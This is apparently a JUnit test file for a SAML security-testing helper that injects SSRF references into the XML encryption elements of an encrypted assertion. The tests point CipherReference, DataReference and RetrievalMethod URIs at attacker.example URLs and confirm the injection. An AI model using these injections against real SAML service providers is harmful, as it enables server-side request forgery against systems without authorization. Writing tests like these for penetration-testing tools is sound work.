package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class EncryptionSSRFTest {

    private static final String XENC_NS = "http://www.w3.org/2001/04/xmlenc#";
    private static final String DS_NS   = "http://www.w3.org/2000/09/xmldsig#";

    /// Realistic fixture: Response containing an EncryptedAssertion with
    /// EncryptedData > EncryptionMethod + KeyInfo(EncryptedKey with inner
    /// EncryptionMethod + KeyInfo(X509Data)) + CipherData(CipherValue).
    private static final String SAML_ENCRYPTED = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="r1">
              <saml:EncryptedAssertion>
                <xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Type="http://www.w3.org/2001/04/xmlenc#Element">
                  <xenc:EncryptionMethod Algorithm="http://www.w3.org/2009/xmlenc11#aes256-gcm"/>
                  <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                    <xenc:EncryptedKey>
                      <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p"/>
                      <ds:KeyInfo>
                        <ds:X509Data><ds:X509Certificate>MIIDUMMY</ds:X509Certificate></ds:X509Data>
                      </ds:KeyInfo>
                      <xenc:CipherData>
                        <xenc:CipherValue>WRAPPED_KEY_B64</xenc:CipherValue>
                      </xenc:CipherData>
                    </xenc:EncryptedKey>
                  </ds:KeyInfo>
                  <xenc:CipherData>
                    <xenc:CipherValue>PAYLOAD_B64</xenc:CipherValue>
                  </xenc:CipherData>
                </xenc:EncryptedData>
              </saml:EncryptedAssertion>
            </samlp:Response>
            """;

    private static Document parse(String xml) throws Exception {
        return new XMLHelpers().getXMLDocumentOfSAMLMessage(xml);
    }

    /// Walks through all xenc:CipherData elements and returns the first one
    /// that is a direct child of the *outer* EncryptedData (i.e. not the one
    /// inside EncryptedKey).
    private static Element outerCipherData(Document doc) {
        NodeList encData = doc.getElementsByTagNameNS(XENC_NS, "EncryptedData");
        Element outer = (Element) encData.item(0);
        for (Node n = outer.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && XENC_NS.equals(n.getNamespaceURI())
                    && "CipherData".equals(n.getLocalName())) {
                return (Element) n;
            }
        }
        return null;
    }

    @Test
    void cipherReferenceReplacesFirstCipherValue() throws Exception {
        String url = "https://attacker.example/cipher";
        String out = EncryptionSSRF.apply(SAML_ENCRYPTED, EncryptionSSRF.Mode.CIPHER_REFERENCE, url);
        Document doc = parse(out);

        // The first CipherData in document order is inside the EncryptedKey,
        // so check by locating EncryptedKey's CipherData specifically.
        Element encKey = (Element) doc.getElementsByTagNameNS(XENC_NS, "EncryptedKey").item(0);
        Element innerCipherData = null;
        for (Node n = encKey.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && "CipherData".equals(n.getLocalName())) {
                innerCipherData = (Element) n;
                break;
            }
        }
        assertNotNull(innerCipherData, "EncryptedKey should retain its CipherData");

        // First CipherData (in doc order) is EncryptedKey's — that's what gets modified.
        NodeList allCipherData = doc.getElementsByTagNameNS(XENC_NS, "CipherData");
        Element firstCipherData = (Element) allCipherData.item(0);
        assertEquals(0, firstCipherData.getElementsByTagNameNS(XENC_NS, "CipherValue").getLength(),
                "CipherValue should have been removed from the first CipherData");
        NodeList refs = firstCipherData.getElementsByTagNameNS(XENC_NS, "CipherReference");
        assertEquals(1, refs.getLength());
        assertEquals(url, ((Element) refs.item(0)).getAttribute("URI"));
    }

    @Test
    void dataReferenceInjectsIntoEncryptedKeyReferenceList() throws Exception {
        String url = "https://attacker.example/dref";
        String out = EncryptionSSRF.apply(SAML_ENCRYPTED, EncryptionSSRF.Mode.DATA_REFERENCE, url);
        Document doc = parse(out);

        Element encKey = (Element) doc.getElementsByTagNameNS(XENC_NS, "EncryptedKey").item(0);
        NodeList refLists = encKey.getElementsByTagNameNS(XENC_NS, "ReferenceList");
        assertEquals(1, refLists.getLength(), "One ReferenceList should exist under EncryptedKey");

        Element refList = (Element) refLists.item(0);
        NodeList dataRefs = refList.getElementsByTagNameNS(XENC_NS, "DataReference");
        assertEquals(1, dataRefs.getLength());
        assertEquals(url, ((Element) dataRefs.item(0)).getAttribute("URI"));
    }

    @Test
    void encryptedKeyKeyInfoRetrievalMethodReplacesInnerKeyInfo() throws Exception {
        String url = "https://attacker.example/key";
        String out = EncryptionSSRF.apply(SAML_ENCRYPTED, EncryptionSSRF.Mode.ENCRYPTED_KEY_KEYINFO, url);
        Document doc = parse(out);

        Element encKey = (Element) doc.getElementsByTagNameNS(XENC_NS, "EncryptedKey").item(0);

        // Locate the *direct child* KeyInfo of EncryptedKey (not a nested one).
        Element innerKeyInfo = null;
        for (Node n = encKey.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && DS_NS.equals(n.getNamespaceURI())
                    && "KeyInfo".equals(n.getLocalName())) {
                innerKeyInfo = (Element) n;
                break;
            }
        }
        assertNotNull(innerKeyInfo, "EncryptedKey's KeyInfo child must still exist");

        // Original X509Data must be gone
        assertEquals(0, innerKeyInfo.getElementsByTagNameNS(DS_NS, "X509Data").getLength());

        NodeList rms = innerKeyInfo.getElementsByTagNameNS(DS_NS, "RetrievalMethod");
        assertEquals(1, rms.getLength());
        Element rm = (Element) rms.item(0);
        assertEquals(url, rm.getAttribute("URI"));
        assertEquals("http://www.w3.org/2001/04/xmlenc#EncryptedKey", rm.getAttribute("Type"));
    }

    @Test
    void cipherReferenceFailsWhenNoCipherData() {
        String noEnc = """
                <?xml version="1.0" encoding="UTF-8"?>
                <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1"/>
                """;
        assertThrows(IllegalArgumentException.class,
                () -> EncryptionSSRF.apply(noEnc, EncryptionSSRF.Mode.CIPHER_REFERENCE, "https://a/"));
    }

    @Test
    void dataReferenceFailsWhenNoEncryptedKey() {
        // EncryptedData without the EncryptedKey wrapper
        String noKey = """
                <?xml version="1.0" encoding="UTF-8"?>
                <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="r1">
                  <saml:EncryptedAssertion>
                    <xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
                      <xenc:CipherData><xenc:CipherValue>X</xenc:CipherValue></xenc:CipherData>
                    </xenc:EncryptedData>
                  </saml:EncryptedAssertion>
                </samlp:Response>
                """;
        assertThrows(IllegalArgumentException.class,
                () -> EncryptionSSRF.apply(noKey, EncryptionSSRF.Mode.DATA_REFERENCE, "https://a/"));
    }

    @Test
    void throwsWhenUrlMissing() {
        assertThrows(IllegalArgumentException.class,
                () -> EncryptionSSRF.apply(SAML_ENCRYPTED, EncryptionSSRF.Mode.CIPHER_REFERENCE, ""));
        assertThrows(IllegalArgumentException.class,
                () -> EncryptionSSRF.apply(SAML_ENCRYPTED, EncryptionSSRF.Mode.CIPHER_REFERENCE, null));
    }

    /// Sanity-check the test fixture itself: first CipherData in doc order is
    /// the one inside EncryptedKey (holds the wrapped session key). This
    /// matters because CIPHER_REFERENCE mode operates on the first CipherData.
    @Test
    void fixtureFirstCipherDataIsInsideEncryptedKey() throws Exception {
        Document doc = parse(SAML_ENCRYPTED);
        Element first = (Element) doc.getElementsByTagNameNS(XENC_NS, "CipherData").item(0);
        Element encKey = (Element) doc.getElementsByTagNameNS(XENC_NS, "EncryptedKey").item(0);

        // First CipherData in doc order should be a descendant of EncryptedKey.
        Element outer = outerCipherData(doc);
        assertNotNull(outer);
        assertNull(null);
        // If first == outer, the fixture order is different from what the test assumes.
        // Walk up to confirm ancestry.
        Node cur = first;
        boolean inEncKey = false;
        while (cur != null) {
            if (cur == encKey) { inEncKey = true; break; }
            cur = cur.getParentNode();
        }
        org.junit.jupiter.api.Assertions.assertTrue(inEncKey,
                "fixture sanity: first CipherData should be the EncryptedKey's wrapped-key container");
    }
}
